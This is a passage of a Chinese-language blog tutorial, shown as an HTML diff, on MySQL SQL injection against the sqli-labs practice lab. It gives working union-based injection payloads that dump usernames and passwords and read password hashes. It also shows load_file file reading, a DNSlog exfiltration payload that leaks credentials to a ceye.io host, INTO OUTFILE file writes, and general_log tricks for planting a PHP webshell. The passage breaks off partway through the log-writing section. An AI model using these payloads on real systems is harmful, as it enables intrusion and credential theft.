+<li>table_privileges表：提供了关于表权限的信息，该信息取自mysql.tables_priv授权表，是非标准表</li>
+<li>column_privileges表：提供了关于列权限的信息，该信息取自mysql.columns_priv授权表，是非标准表</li>
+<li>character_sets表：提供了mysql实例可用字符集的信息。show character set结果取自该表</li>
+<li>collations表：提供了关于各字符集的对照信息</li>
+<li>collation_sharacter_set_applicability表：指明了可用于校对的字符集，这些列等效于show collation的前两个显示字段</li>
+<li>table_constraints表：指明了存在约束的表以及表的约束类型</li>
+<li>key_column_usage表：指明了具有约束的键列</li>
+<li>routines表：指明了关于存储子程序（存储程序和函数）的信息。此时routines表不包含自定义函数（UDF），而名为mysql.proc name的列指明了information_schema.routines表的mysql.proc表列</li>
+<li>view表：指明了关于数据库中的视图信息，需要拥有show view权限，否则无法看到视图信息</li>
+<li>triggers表：指明了关于触发程序的信息，必须拥有super权限才能查看该表</li>
+</ul>
+</blockquote>
+<p>利用 information_schema 中的表查询相关数据</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">schemata</span>        <span class="string">包含所有数据库名、类型、字符集等</span></span><br><span class="line"><span class="string">tables</span>          <span class="string">包含所有表信息</span></span><br><span class="line"><span class="string">columns</span>         <span class="string">包含所有列信息</span></span><br></pre></td></tr></table></figure>
+<p>查询<code>schemata</code>中的第一个库名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata limit <span class="number">0</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/%E6%88%AA%E5%B1%8F2021-09-24%20%E4%B8%8A%E5%8D%881.21.12.png" alt="截屏2021-09-24 上午1.21.12"></p>
+<p>查询<code>information_schema</code>中的数据信息</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;information_schema&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/%E6%88%AA%E5%B1%8F2021-09-24%20%E4%B8%8A%E5%8D%881.23.22.png" alt="截屏2021-09-24 上午1.23.22"></p>
+<p>通过十六进制转换后查询</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> hex(<span class="string">&#x27;information_schema&#x27;</span>);</span><br><span class="line"># <span class="number">696E666</span>F726D6174696F6E5F736368656D61</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="number">0x696E666F726D6174696F6E5F736368656D61</span> limit <span class="number">0</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/%E6%88%AA%E5%B1%8F2021-09-24%20%E4%B8%8A%E5%8D%881.25.56.png" alt="截屏2021-09-24 上午1.25.56"></p>
+<p>查询表名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="number">0x696E666F726D6174696F6E5F736368656D61</span> <span class="keyword">and</span> table_name <span class="operator">=</span> <span class="string">&#x27;character_sets&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/%E6%88%AA%E5%B1%8F2021-09-24%20%E4%B8%8A%E5%8D%881.29.15.png" alt="截屏2021-09-24 上午1.29.15"></p>
+<p>通过查询到的表名、列名查询数据信息</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> id,username,password <span class="keyword">from</span> test.users;</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/%E6%88%AA%E5%B1%8F2021-09-24%20%E4%B8%8A%E5%8D%881.33.44.png" alt="截屏2021-09-24 上午1.33.44"></p>
+<p>有了以上基础，我们就以 sqlilabs 为例开始测试 SQL 注入，注入方式为基础的联合查询注入<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/%E6%88%AA%E5%B1%8F2021-12-04%20%E4%B8%8B%E5%8D%8810.28.07.png" alt="截屏2021-12-04 下午10.28.07"></p>
+<p>目标SQL语句如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = select * <span class="keyword">from</span> users where id=<span class="string">&#x27;$id&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"><span class="comment"># 返回内容</span></span><br><span class="line"><span class="keyword">if</span> <span class="literal">true</span>:</span><br><span class="line">    输出查询内容</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print_r(mysql_error());</span><br></pre></td></tr></table></figure>
+
+<p>判断注入点</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span> <span class="operator">/</span><span class="operator">/</span>返回正常界面</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/%E6%88%AA%E5%B1%8F2021-12-04%20%E4%B8%8B%E5%8D%8810.34.02.png" alt="截屏2021-12-04 下午10.34.02"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">2</span> <span class="operator">/</span><span class="operator">/</span>返回错误界面</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/%E6%88%AA%E5%B1%8F2021-12-04%20%E4%B8%8B%E5%8D%8810.34.33.png" alt="截屏2021-12-04 下午10.34.33"></p>
+<p>判断字段数</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 3--+ //返回正常界面</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/%E6%88%AA%E5%B1%8F2021-12-04%20%E4%B8%8B%E5%8D%8810.38.19.png" alt="截屏2021-12-04 下午10.38.19"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 4--+ //返回错误界面</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/%E6%88%AA%E5%B1%8F2021-12-04%20%E4%B8%8B%E5%8D%8810.38.07.png" alt="截屏2021-12-04 下午10.38.07"></p>
+<p>由此可说明字段数为3，通过 union select 查看回显位置</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,3--+</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/%E6%88%AA%E5%B1%8F2021-12-04%20%E4%B8%8B%E5%8D%8810.40.33.png" alt="截屏2021-12-04 下午10.40.33"></p>
+<p>查询基础信息</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,version(),user()--+</span></span><br><span class="line"><span class="string">id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,@<span class="variable">@version</span>_compile_os()，database()<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/%E6%88%AA%E5%B1%8F2021-12-04%20%E4%B8%8B%E5%8D%8810.43.32.png" alt="截屏2021-12-04 下午10.43.32"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/%E6%88%AA%E5%B1%8F2021-12-04%20%E4%B8%8B%E5%8D%8810.45.23.png" alt="截屏2021-12-04 下午10.45.23"></p>
+<p>查询表名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = &#x27;</span>security<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/%E6%88%AA%E5%B1%8F2021-12-04%20%E4%B8%8B%E5%8D%8810.49.07.png" alt="截屏2021-12-04 下午10.49.07"></p>
+<p>查询列名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name = &#x27;</span>users<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/%E6%88%AA%E5%B1%8F2021-12-04%20%E4%B8%8B%E5%8D%8810.50.32.png" alt="截屏2021-12-04 下午10.50.32"></p>
+<p>查询关键信息</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(username),group_concat(password) from users--+</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/%E6%88%AA%E5%B1%8F2021-12-04%20%E4%B8%8B%E5%8D%8810.53.34.png" alt="截屏2021-12-04 下午10.53.34"></p>
+<h4 id="哈希获取与解密"><a href="#哈希获取与解密" class="headerlink" title="哈希获取与解密"></a>哈希获取与解密</h4><p>使用SQL语句查询到用户哈希命令如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> host,<span class="keyword">user</span>,password <span class="keyword">from</span> mysql.user; <span class="operator">/</span><span class="operator">/</span>MySQL<span class="operator">&lt;=</span><span class="number">5.6</span></span><br><span class="line"><span class="keyword">select</span> host,<span class="keyword">user</span>,authentication_string <span class="keyword">from</span> mysql.user; <span class="operator">/</span><span class="operator">/</span>MySQL<span class="operator">&gt;=</span><span class="number">5.7</span></span><br></pre></td></tr></table></figure>
+
+<p>通过 sqlmap 能够直接获取用户哈希</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u xxx <span class="comment">--passwords</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/%E6%88%AA%E5%B1%8F2022-06-16%2011.27.35.png" alt="截屏2022-06-16 11.27.35"></p>
+<p>如果遇到哈希值无法破解的情况，通过md5解密网站也可拿到明文密码<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/%E6%88%AA%E5%B1%8F2022-06-16%2011.27.25.png" alt="截屏2022-06-16 11.27.25"></p>
+<h4 id="文件读取与写入"><a href="#文件读取与写入" class="headerlink" title="文件读取与写入"></a>文件读取与写入</h4><p>文件读取和写入需要满足以下几个前提条件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、拥有高权限数据库用户，比如root</span><br><span class="line">2、secure_file_priv无限制</span><br><span class="line">3、当前用户对目标目录拥有读取/写入权限</span><br><span class="line">4、知道读取/写入的绝对路径</span><br></pre></td></tr></table></figure>
+<p>通过<code>load_file()</code>函数读取文件命令如下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&#x27;/var/www/html/index.php&#x27;) //Linux</span><br><span class="line">select load_file(&#x27;C:\\phpStudy\\WWW\\shell.php&#x27;) //Windows</span><br></pre></td></tr></table></figure>
+<p>成功读取目标文件内容</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,load_file(&#x27;C:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.php&#x27;)--+</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/%E6%88%AA%E5%B1%8F2022-06-16%2014.49.56.png" alt="截屏2022-06-16 14.49.56"></p>
+<p>与此同时<code>load_file()</code>还能够通过 dnslog 的方式读取文件内容，但是在 Linux 下无法使用 dnslog 进行攻击，这是因为 Windows 有 UNC 路径，而 Linux 没有。那什么是 UNC 路径呢？UNC 路径是通过命名规定用于远程共享文件的一种格式，具体格式如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\servername\sharename\filname</span><br></pre></td></tr></table></figure>
+<p>例如<code>\\192.168.0.132\mac\</code>是一个的典型的 UNC 路径，MySQL 中的<code>concat</code>函数会拼接这其中的反斜杠符<code>\</code>，通过转移反斜杠符<code>\</code>变成了两个反斜杠符<code>\\</code>，利用 UNC 路径可完成 dnslog 外带数据攻击</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27;;select load_file(concat(&#x27;\\\\&#x27;,(select hex(concat_ws(0x7e,username,password)) from users limit 0,1),&#x27;.qk9fw5.ceye.io\\mac&#x27;))--+</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/%E6%88%AA%E5%B1%8F2022-05-12%2017.34.13.png" alt="截屏2022-05-12 17.34.13"></p>
+<p>在 dnslog 平台上返回查询结果，使用 hex 编码可有效减少特殊符号的干扰<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/%E6%88%AA%E5%B1%8F2022-05-12%2017.34.02.png" alt="截屏2022-05-12 17.34.02"></p>
+<p>解码 hex 编码还原数据</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 44756D627E44756D62 | python3 -c &quot;import sys, binascii; sys.stdout.buffer.write(binascii.unhexlify(input().strip()))&quot;</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/%E6%88%AA%E5%B1%8F2022-05-12%2017.37.44.png" alt="截屏2022-05-12 17.37.44"></p>
+<p>通过 into outfile 以及 into dumpfile 则能够直接写入文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,&#x27;&lt;?php phpinfo();?&gt;&#x27; into outfile &#x27;C:\\phpStudy\\PHPTutorial\\WWW\\test.php&#x27;--+</span><br><span class="line">?id=-1&#x27; union select 1,2,0x3c3f70687020706870696e666f28293b3f3e into outfile &#x27;C:\\phpStudy\\PHPTutorial\\WWW\\test.php&#x27;--+</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/%E6%88%AA%E5%B1%8F2022-06-16%2015.20.19.png" alt="截屏2022-06-16 15.20.19"></p>
+<p>直接访问木马如下，说明写入成功<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/%E6%88%AA%E5%B1%8F2022-06-16%2015.20.35.png" alt="截屏2022-06-16 15.20.35"></p>
+<p>通过以下命令可查询 MySQL 特性<code>secure_file_priv</code>是否开启</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> <span class="string">&#x27;%secure_file_priv%&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th align="left">Value</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">NULL</td>
+<td align="left">不允许导入或导出</td>
+</tr>
+<tr>
+<td align="left">/tmp</td>
+<td align="left">只允许在 /tmp 目录导入导出</td>
+</tr>
+<tr>
+<td align="left">空</td>
+<td align="left">不限制目录</td>
+</tr>
+</tbody></table>
+<blockquote>
+<ul>
+<li>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件</li>
+<li>在 MySQL 5.5 之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件</li>
+</ul>
+</blockquote>
+<h4 id="日志查询写入shell"><a href="#日志查询写入shell" class="headerlink" title="日志查询写入shell"></a>日志查询写入shell</h4><p>那么当<code>secure_file_priv</code>不为空时，还有什么可以方式能够获取权限呢？答案是通过日志写入，主要分为常规日志写入和慢查询日志写入。其中利用条件如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、拥有高权限数据库用户，比如root</span><br><span class="line">2、当前用户对目标目录拥有写入权限</span><br><span class="line">3、知道读取/写入的绝对路径</span><br></pre></td></tr></table></figure>
+<p>首先查询当前常规日志的相关配置</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;general%&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/%E6%88%AA%E5%B1%8F2022-05-12%2018.17.31.png" alt="截屏2022-05-12 18.17.31"></p>
+<p>还是以 sqlilabs 为例进行测试，通过堆叠注入开启日志并设置日志存储路径</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;;set global general_log=&quot;on&quot;;set global general_log_file=&#x27;</span>C:\\phpStudy\\PHPTutorial\\WWW\\mac.php<span class="string">&#x27;;--+</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/%E6%88%AA%E5%B1%8F2022-05-13%2009.18.03.png" alt="截屏2022-05-13 09.18.03"></p>
+<p>再次查看日志，发现日志配置已修改完成</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;general%&#x27;</span>;</span><br></pre></td></tr></table></figure>
